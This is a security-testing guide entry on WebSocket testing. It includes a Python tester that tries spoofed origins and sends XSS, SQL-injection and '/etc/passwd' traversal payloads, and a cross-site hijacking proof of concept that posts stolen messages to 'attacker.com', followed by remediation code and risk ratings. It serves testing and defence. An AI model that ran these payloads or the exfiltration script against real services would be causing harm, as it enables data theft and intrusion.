# WSTG-CLNT-10: Testing WebSockets

## Test ID
WSTG-CLNT-10

## Test Name
Testing WebSockets

## High-Level Description

WebSockets provide full-duplex communication channels over a single TCP connection. Security issues can arise from missing authentication, lack of input validation, cross-site WebSocket hijacking, and insecure data transmission.

---

## What to Check

- [ ] WebSocket authentication
- [ ] Origin validation
- [ ] Input validation
- [ ] Encryption (WSS)
- [ ] Rate limiting
- [ ] Authorization per message

---

## How to Test

### Step 1: Identify WebSocket Endpoints

```javascript
// Browser console
// Check for WebSocket connections
console.log("WebSocket instances:", window.WebSocket);

// Monitor WebSocket creation
const originalWS = window.WebSocket;
window.WebSocket = function(...args) {
    console.log('WebSocket created:', args);
    return new originalWS(...args);
};
```

### Step 2: Test WebSocket Security

```python
#!/usr/bin/env python3
import asyncio
import websockets
import json

class WebSocketTester:
    def __init__(self, ws_url):
        self.ws_url = ws_url
        self.findings = []

    async def test_origin(self):
        """Test origin validation"""
        print("[*] Testing origin validation...")

        origins = [
            "https://evil.com",
            "null",
            "",
        ]

        for origin in origins:
            try:
                headers = {"Origin": origin}
                async with websockets.connect(
                    self.ws_url,
                    extra_headers=headers
                ) as ws:
                    print(f"[VULN] Accepted origin: {origin}")
                    self.findings.append({
                        "issue": f"Accepts origin: {origin}",
                        "severity": "High"
                    })
            except Exception as e:
                print(f"[OK] Rejected origin: {origin}")

    async def test_no_auth(self):
        """Test if authentication is required"""
        print("\n[*] Testing authentication...")

        try:
            async with websockets.connect(self.ws_url) as ws:
                # Try sending a message without auth
                await ws.send(json.dumps({"action": "get_data"}))
                response = await asyncio.wait_for(ws.recv(), timeout=5)
                print(f"[VULN] No authentication required")
                print(f"  Response: {response[:100]}")
                self.findings.append({
                    "issue": "No WebSocket authentication",
                    "severity": "High"
                })
        except Exception as e:
            print(f"[INFO] Connection result: {e}")

    async def test_injection(self):
        """Test for injection vulnerabilities"""
        print("\n[*] Testing injection...")

        payloads = [
            '{"message": "<script>alert(1)</script>"}',
            '{"query": "1 OR 1=1"}',
            '{"path": "../../../etc/passwd"}',
        ]

        try:
            async with websockets.connect(self.ws_url) as ws:
                for payload in payloads:
                    await ws.send(payload)
                    try:
                        response = await asyncio.wait_for(ws.recv(), timeout=2)
                        print(f"  Payload: {payload[:30]}")
                        print(f"  Response: {response[:50]}")
                    except:
                        pass
        except Exception as e:
            pass

    async def run_tests(self):
        await self.test_origin()
        await self.test_no_auth()
        await self.test_injection()

# Usage
tester = WebSocketTester("wss://target.com/ws")
asyncio.run(tester.run_tests())
```

### Step 3: Cross-Site WebSocket Hijacking

```html
<!-- Host on attacker.com -->
<script>
    // If origin is not validated, can hijack WebSocket
    const ws = new WebSocket('wss://target.com/ws');

    ws.onopen = function() {
        ws.send(JSON.stringify({action: 'get_sensitive_data'}));
    };

    ws.onmessage = function(event) {
        // Steal data
        fetch('https://attacker.com/log', {
            method: 'POST',
            body: event.data
        });
    };
</script>
```

---

## Remediation

```python
# Validate origin in WebSocket connection
@websocket.route('/ws')
async def websocket_handler(ws):
    origin = ws.headers.get('Origin')
    allowed_origins = ['https://trusted.com']

    if origin not in allowed_origins:
        await ws.close(code=1008, reason='Invalid origin')
        return

    # Require authentication
    token = ws.headers.get('Authorization')
    if not validate_token(token):
        await ws.close(code=1008, reason='Unauthorized')
        return

    # Process messages with input validation
    async for message in ws:
        data = sanitize_input(json.loads(message))
        # Process...
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| No origin validation | 8.1 | High |
| No authentication | 7.5 | High |
| Injection vulnerabilities | 7.5 | High |
| Unencrypted (WS not WSS) | 5.3 | Medium |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-1385** | Missing Origin Validation in WebSockets |

---

## Checklist

```
[ ] WebSocket endpoints identified
[ ] Origin validation tested
[ ] Authentication tested
[ ] WSS encryption checked
[ ] Input validation tested
[ ] Findings documented
```
